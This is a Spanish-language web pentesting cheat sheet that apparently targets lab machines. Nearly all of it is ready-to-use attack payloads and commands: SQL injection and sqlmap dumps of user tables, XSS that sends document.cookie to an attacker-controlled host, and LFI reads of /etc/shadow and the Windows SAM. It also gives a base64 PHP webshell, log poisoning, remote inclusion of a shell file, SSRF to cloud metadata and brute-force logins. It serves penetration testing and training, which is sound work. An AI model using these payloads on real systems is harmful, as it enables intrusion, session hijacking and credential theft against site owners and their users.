# Nombre: cheatsheet-web
# Descripción: Pentesting de aplicaciones web: SQLi, XSS, LFI/RFI, SSRF, directorios, headers y fingerprinting.
# Tags: web, sqli, xss, lfi, rfi, ssrf, nikto, gobuster, ffuf, burp
# Uso: referencia rápida para auditoría de apps web

# Cheatsheet de Pentesting Web

## 1. Fingerprinting y Tecnologías

```bash
# Cabeceras HTTP
curl -sI http://10.10.10.5/
curl -sI https://10.10.10.5/ | grep -i "server\|x-powered-by\|x-aspnet"

# Wappalyzer (extensión de navegador) o:
whatweb http://10.10.10.5

# Fingerprint con nmap
nmap -sV --script http-enum,http-headers,http-title -p 80,443 10.10.10.5

# Tecnologías por robots.txt / sitemap.xml
curl -s http://10.10.10.5/robots.txt
curl -s http://10.10.10.5/sitemap.xml

# Archivos comunes
curl -s http://10.10.10.5/.git/config
curl -s http://10.10.10.5/.env
curl -s http://10.10.10.5/wp-config.php.bak
curl -s http://10.10.10.5/web.config
```

## 2. Enumeración de Directorios

```bash
# gobuster
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# ffuf (más rápido)
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt -mc 200,301,302,403

# dirsearch
dirsearch -u http://10.10.10.5 -e php,html,js

# Subdominios
gobuster dns -u example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## 3. SQL Injection (SQLi)

```bash
# Test básico
' OR 1=1--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Union-based
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Error-based
' AND ExtractValue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND Updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--

# Blind SQLi
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

# Automático
sqlmap -u "http://10.10.10.5/page?id=1" --dbs --batch
sqlmap -u "http://10.10.10.5/page?id=1" -D mydb --tables
sqlmap -u "http://10.10.10.5/page?id=1" -D mydb -T users --dump
```

## 4. Cross-Site Scripting (XSS)

```html
<!-- Reflected XSS -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- Stored XSS (en campos de formulario) -->
<script>fetch('http://10.10.14.5/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('http://10.10.14.5/'+document.cookie)">

<!-- DOM-based -->
<script>document.location='http://10.10.14.5/steal?c='+document.cookie</script>

# Reflejar variables de entorno
{{7*7}}  # SSTI
${7*7}   # Template injection
<%= 7*7 %>
```

## 5. Local File Inclusion (LFI)

```bash
# Paths comunes
http://10.10.10.5/page?file=../../../../etc/passwd
http://10.10.10.5/page?file=../../../../etc/shadow
http://10.10.10.5/page?file=../../../../proc/self/environ
http://10.10.10.5/page?file=../../../../proc/self/cmdline

# Windows
http://10.10.10.5/page?file=..\..\..\windows\system32\drivers\etc\hosts
http://10.10.10.5/page?file=..\..\..\windows\win.ini
http://10.10.10.5/page?file=C:\Windows\System32\config\SAM

# PHP wrappers
http://10.10.10.5/page?file=php://filter/convert.base64-encode/resource=config.php
http://10.10.10.5/page?file=php://input   # POST body
http://10.10.10.5/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/

# Null byte (PHP < 5.3.4)
http://10.10.10.5/page?file=../../../../etc/passwd%00

# Log poisoning
http://10.10.10.5/page?file=../../../../var/log/apache2/access.log
# User-Agent: <?php system($_GET['cmd']); ?>
http://10.10.10.5/page?file=../../../../var/log/apache2/access.log&cmd=id
```

## 6. Remote File Inclusion (RFI)

```bash
# Incluir archivo remoto
http://10.10.10.5/page?file=http://10.10.14.5/shell.txt
http://10.10.10.5/page?file=http://10.10.14.5/shell.txt?

# PHP wrappers
http://10.10.10.5/page?file=php://input  # POST <?php system('id'); ?>
```

## 7. Server-Side Request Forgery (SSRF)

```bash
# Acceder a servicios internos
http://10.10.10.5/proxy?url=http://127.0.0.1:8080/
http://10.10.10.5/proxy?url=http://169.254.169.254/latest/meta-data/  # AWS
http://10.10.10.5/proxy?url=http://metadata.google.internal/  # GCP

# Filtros comunes
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://0177.0.0.1
http://0x7f.0.0.1
```

## 8. Archivos Sensibles

```bash
# Configuraciones
http://10.10.10.5/.git/config
http://10.10.10.5/.env
http://10.10.10.5/config.php
http://10.10.10.5/web.config
http://10.10.10.5/.htaccess
http://10.10.10.5/wp-config.php

# Backups
http://10.10.10.5/config.php.bak
http://10.10.10.5/config.php~
http://10.10.10.5/index.php.swp
http://10.10.10.5/backup.zip
http://10.10.10.5/db.sql

# Info
http://10.10.10.5/phpinfo.php
http://10.10.10.5/server-status
http://10.10.10.5/server-info
http://10.10.10.5/.DS_Store
```

## 9. Escáneres de Vulnerabilidades Web

```bash
# Nikto
nikto -h http://10.10.10.5
nikto -h http://10.10.10.5 -Tuning 123456789

# WPScan (WordPress)
wpscan --url http://10.10.10.5 --enumerate vp,vt,u
wpscan --url http://10.10.10.5 --passwords rockyou.txt --usernames admin

# Nuclei
nuclei -u http://10.10.10.5 -t cves/
nuclei -u http://10.10.10.5 -t technologies/

# Whatweb
whatweb http://10.10.10.5 -a 3
```

## 10. Interceptar Tráfico (Burp Suite)

```bash
# Proxy en Burp: 127.0.0.1:8080
# Configurar navegador → proxy → 127.0.0.1:8080
# Instalar certificado CA de Burp para HTTPS

# cURL a través de Burp
curl -x http://127.0.0.1:8080 http://10.10.10.5/
curl -x http://127.0.0.1:8080 -k https://10.10.10.5/
```

## 11. Autenticación y Sesiones

```bash
# Test de credenciales por defecto
admin:admin
admin:password
root:root
admin:123456

# Burp: intruder para fuerza bruta
# Token JWT: jwt_tool para manipular/forjar tokens
# Sesiones: cambiar Cookie: session=otro_valor
```

## 12. Bypass de Filtros

```bash
# Case bypass
<ScRiPt>alert(1)</ScRiPt>

# Doble encoding
%253Cscript%253E

# Null byte
%00

# Comentarios SQL
UN/**/ION SEL/**/ECT

# Dinámico
${7*7}
<%= 7*7 %>
{{7*7}}
```

## Tips
- Siempre empezar por fingerprinting antes de explotar
- `ffuf` es más rápido que `gobuster` para fuzzing masivo
- Usar Burp Suite para interceptar y modificar peticiones
- Revisar JavaScript del sitio (APIs ocultas, endpoints)
- Probar tanto GET como POST, y parámetros en cookies/headers
